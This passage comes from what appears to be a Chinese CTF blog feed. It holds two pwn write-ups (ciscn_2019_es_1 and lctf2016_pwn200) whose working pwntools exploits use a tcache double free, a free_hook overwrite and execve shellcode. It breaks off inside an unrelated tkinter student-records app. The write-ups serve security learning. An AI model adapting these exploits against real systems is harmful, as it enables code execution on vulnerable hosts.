alt="image-20230921163638325"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook_addr = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">base_addr = malloc_hook_addr - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = base_addr + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system_addr = base_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="然后用double-free，free两次堆2，然后堆2的如下，以及bin"><a href="#然后用double-free，free两次堆2，然后堆2的如下，以及bin" class="headerlink" title="然后用double free，free两次堆2，然后堆2的如下，以及bin"></a>然后用double free，free两次堆2，然后堆2的如下，以及bin</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJ1ju.png" alt="image-20230921164207791"></p><p><img src="https://i0.imgs.ovh/2024/01/22/sJUkd.png" alt="image-20230921164236453"></p><h4 id="bin指针链0x000055ac61f846c0这个地址记录了它本身"><a href="#bin指针链0x000055ac61f846c0这个地址记录了它本身" class="headerlink" title="bin指针链0x000055ac61f846c0这个地址记录了它本身"></a>bin指针链0x000055ac61f846c0这个地址记录了它本身</h4><h4 id="这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free-hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free-hook，我们再malloc"><a href="#这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free-hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free-hook，我们再malloc" class="headerlink" title="这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free_hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free_hook，我们再malloc"></a>这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free_hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free_hook，我们再malloc</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJja2.png" alt="image-20230921164455578"></p><h4 id="这时bin链的指针指到了free-hook，我们再malloc两次就能把free-hook函数的地址内容改成system函数的地址-而都同add函数一样正常mollc，参数bin-sh放在堆3"><a href="#这时bin链的指针指到了free-hook，我们再malloc两次就能把free-hook函数的地址内容改成system函数的地址-而都同add函数一样正常mollc，参数bin-sh放在堆3" class="headerlink" title="这时bin链的指针指到了free_hook，我们再malloc两次就能把free_hook函数的地址内容改成system函数的地址,而都同add函数一样正常mollc，参数bin/sh放在堆3"></a>这时bin链的指针指到了free_hook，我们再malloc两次就能把free_hook函数的地址内容改成system函数的地址,而都同add函数一样正常mollc，参数bin/sh放在堆3</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJitK.png" alt="image-20230921164925744"></p><p><img src="https://i0.imgs.ovh/2024/01/22/sJ5wj.png" alt="image-20230921165411511"></p><p>exp</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",28022)</span></span><br><span class="line">p=process(<span class="string">"./ciscn_2019_es_1"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf=ELF(<span class="string">"./ciscn_2019_es_1"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"name"</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(size)))</span><br><span class="line">    p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">"call"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">dex</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index:"</span>,<span class="built_in">str</span>(dex))  </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">dex</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index:\n"</span>,<span class="built_in">str</span>(dex)) </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">"AAAA"</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"AAAA"</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook_addr = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">base_addr = malloc_hook_addr - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = base_addr + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system_addr = base_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'MMMM'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lctf2016_pwn200</title>
      <link href="//posts/6f5f7bb7/"/>
      <url>//posts/6f5f7bb7/</url>
      
        <content type="html"><![CDATA[<h3 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a>lctf2016_pwn200</h3><h4 id="一道有点难的堆题"><a href="#一道有点难的堆题" class="headerlink" title="一道有点难的堆题"></a>一道有点难的堆题</h4><h4 id="这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来"><a href="#这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来" class="headerlink" title="这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来"></a>这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ3VW.png" alt="image-20240114222351986"></p><h4 id="下面小a的末尾的rbp寄存器存着主函数的rbp"><a href="#下面小a的末尾的rbp寄存器存着主函数的rbp" class="headerlink" title="下面小a的末尾的rbp寄存器存着主函数的rbp"></a>下面小a的末尾的rbp寄存器存着主函数的rbp</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZfWv.png" alt="image-20240114222408532"></p><h4 id="后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk-还有我们的shellcode"><a href="#后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk-还有我们的shellcode" class="headerlink" title="后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode"></a>后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZmge.png" alt="image-20240114222423230"></p><h4 id="shellcode第一个得是’-x00’防止复制过去，造成影响"><a href="#shellcode第一个得是’-x00’防止复制过去，造成影响" class="headerlink" title="shellcode第一个得是’\x00’防止复制过去，造成影响"></a>shellcode第一个得是’\x00’防止复制过去，造成影响</h4><h4 id="申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构"><a href="#申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构" class="headerlink" title="申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构"></a>申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ6N3.png" alt="image-20240114222437905"></p><p><img src="https://i0.imgs.ovh/2024/01/14/hZkp9.png" alt="image-20240114222456777"></p><h4 id="然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。"><a href="#然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。" class="headerlink" title="然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。"></a>然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。</h4><h4 id="shellcode的结构应该写出这样的结构。"><a href="#shellcode的结构应该写出这样的结构。" class="headerlink" title="shellcode的结构应该写出这样的结构。"></a>shellcode的结构应该写出这样的结构。</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ07O.png" alt="image-20240114222514160"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="number">3</span>*p64(<span class="number">0</span>)+p64(rbp-<span class="number">0xc0</span>+<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure><h4 id="再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode"><a href="#再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode" class="headerlink" title="再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode"></a>再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://i0.imgs.ovh/2024/01/14/hZpiJ.png" alt="image-20231010144445729"></h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",28868)</span></span><br><span class="line">p=process(<span class="string">"./pwn200"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line">p.sendafter(<span class="string">'u?'</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x30</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">"\x00\x31\xf6\x48\xbb\x2f\x62\x69\x6e"</span></span><br><span class="line">shellcode+= <span class="string">"\x2f\x2f\x73\x68\x56\x53\x54\x5f"</span></span><br><span class="line">shellcode += <span class="string">"\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">payload=(shellcode+<span class="number">2</span>*p64(<span class="number">0</span>)+p64(<span class="number">0X41</span>)).ljust(<span class="number">0x38</span>,<span class="string">'\x00'</span>)  <span class="comment">#gouzhao fakebchunk</span></span><br><span class="line">payload+=p64(rbp-<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'id ~~?'</span>,<span class="string">'31'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp-<span class="number">0x90</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'money~'</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice : '</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="comment">#p.recvuntil('\n')</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'choice : '</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'long?'</span>,<span class="string">'48'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="number">3</span>*p64(<span class="number">0</span>)+p64(rbp-<span class="number">0xc0</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'money : '</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice : '</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python课设</title>
      <link href="//posts/5eca8ee9/"/>
      <url>//posts/5eca8ee9/</url>
      
        <content type="html"><![CDATA[<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox, simpledialog</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">STUDENT_FILE = <span class="string">'students.json'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_students</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(STUDENT_FILE):</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(STUDENT_FILE, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">return</span> json.load(file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_students</span>(<span class="params">students</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(STUDENT_FILE, <span class="string">'w'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        json.dump(students, file, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_students</span>(<span class="params">students</span>):</span><br><span class="line">    sorted_students = <span class="built_in">sorted</span>(students, key=<span class="keyword">lambda</span> x: x[<span class="string">'id'</span>])  <span class="comment"># 按学号排序</span></span><br><span class="line">    students_text = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> student <span class="keyword">in</span> sorted_students:</span><br><span class="line">        students_text += <span class="string">f"学号: <span class="subst">{student[<span class="string">'id'</span>]}</span>\n"</span></span><br><span class="line">        students_text += <span class="string">f"姓名: <span class="subst">{student[<span class="string">'name'</span>]}</span>\n"</span></span><br><span class="line">        students_text += <span class="string">f"年龄: <span class="subst">{student[<span class="string">'age'</span>]}</span>\n"</span></span><br><span class="line">        students_text += <span class="string">f"性别: <span class="subst">{student[<span class="string">'gender'</span>]}</span>\n\n"</span></span><br><span class="line">    <span class="keyword">return</span> students_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_id</span>(<span class="params">student_id</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(student_id.strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_student</span>(<span class="params">students</span>):</span><br><span class="line">    dialog = tk.Toplevel()</span><br><span class="line">    dialog.title(<span class="string">"添加学生信息"</span>)</span><br><span class="line">    dialog.geometry(<span class="string">"250x200+900+400"</span>)</span><br><span class="line">    tk.Label(dialog, text=<span class="string">"学号："</span>).grid(row=<span class="number">0</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">    id_var = tk.StringVar()</span><br><span class="line">    tk.Entry(dialog, textvariable=id_var).grid(row=<span class="number">0</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    tk.Label(dialog, text=<span class="string">"姓名："</span>).grid(row=<span class="number">1</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">    name_var = tk.StringVar()</span><br><span class="line">    tk.Entry(dialog, textvariable=name_var).grid(row=<span class="number">1</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    tk.Label(dialog, text=<span class="string">"年龄："</span>).grid(row=<span class="number">2</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">    age_var = tk.StringVar()</span><br><span class="line">    tk.Entry(dialog, textvariable=age_var).grid(row=<span class="number">2</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    tk.Label(dialog, text=<span class="string">"性别："</span>).grid(row=<span class="number">3</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">    gender_var = tk.StringVar()</span><br><span class="line">    gender_var.<span class="built_in">set</span>(<span class="string">"男"</span>)</span><br><span class="line">    gender_menu = tk.OptionMenu(dialog, gender_var, <span class="string">"男"</span>, <span class="string">"女"</span>)</span><br><span class="line">    gender_menu.grid(row=<span class="number">3</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_student_action</span>():</span><br><span class="line">        student_info = {</span><br><span class="line">            <span class="string">'id'</span>: id_var.get(),</span><br><span class="line">            <span class="string">'name'</span>: name_var.get(),</span><br><span class="line">            <span class="string">'age'</span>: age_var.get(),</span><br><span class="line">            <span class="string">'gender'</span>: gender_var.get()</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> student_info[<span class="string">'id'</span>] <span class="keyword">or</span> <span class="keyword">not</span> validate_id(student_info[<span class="string">'id'</span>]):</span><br><span class="line">            messagebox.showerror(<span class="string">"错误"</span>, <span class="string">"学号格式错误，请重新输入。"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(student[<span class="string">'id'</span>] == student_info[<span class="string">'id'</span>] <span class="keyword">for</span> student <span class="keyword">in</span> students):</span><br><span class="line">            messagebox.showerror(<span class="string">"错误"</span>, <span class="string">"学号已存在，请重新输入。"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        students.append(student_info)</span><br><span class="line">        messagebox.showinfo(<span class="string">"成功"</span>, <span class="string">"学生信息添加成功！"</span>)</span><br><span class="line">        dialog.destroy()</span><br><span class="line"></span><br><span class="line">    add_button = tk.Button(dialog, text=<span class="string">"添加"</span>, command=add_student_action)</span><br><span class="line">    add_button.grid(row=<span class="number">4</span>, columnspan=<span class="number">2</span>, pady=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_student</span>(<span class="params">students</span>):</span><br><span class="line">    student_id = simpledialog.askstring(<span class="string">"输入"</span>, <span class="string">"请输入要编辑的学号："</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> student_id <span class="keyword">or</span> <span class="keyword">not</span> validate_id(student_id):</span><br><span class="line">        messagebox.showerror(<span class="string">"错误"</span>, <span class="string">"学号格式错误，请重新输入。"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    student = <span class="built_in">next</span>((s <span class="keyword">for</span> s <span class="keyword">in</span> students <span class="keyword">if</span> s[<span class="string">'id'</span>] == student_id), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> student:</span><br><span class="line">        messagebox.showinfo(<span class="string">"信息"</span>, <span class="string">f"学号: <span class="subst">{student[<span class="string">'id'</span>]}</span>\n姓名: <span class="subst">{student[<span class="string">'name'</span>]}</span>\n年龄: <span class="subst">{student[<span class="string">'age'</span>]}</span>\n性别: <span class="subst">{student[<span class="string">'gender'</span>]}</span>"</span>)</span><br><span class="line"></span><br><span class="line">        dialog = tk.Toplevel()</span><br><span class="line">        dialog.title(<span class="string">"编辑学生信息"</span>)</span><br><span class="line">        dialog.geometry(<span class="string">"250x200+900+400"</span>)</span><br><span class="line">        tk.Label(dialog, text=<span class="string">"姓名："</span>).grid(row=<span class="number">1</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">        name_var = tk.StringVar(value=student[<span class="string">'name'</span>])</span><br><span class="line">        tk.Entry(dialog, textvariable=name_var).grid(row=<span class="number">1</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        tk.Label(dialog, text=<span class="string">"年龄："</span>).grid(row=<span class="number">2</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line">        age_var = tk.StringVar(value=<span class="built_in">str</span>(student[<span class="string">'age'</span>]))</span><br><span class="line">        tk.Entry(dialog, textvariable=age_var).grid(row=<span class="number">2</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        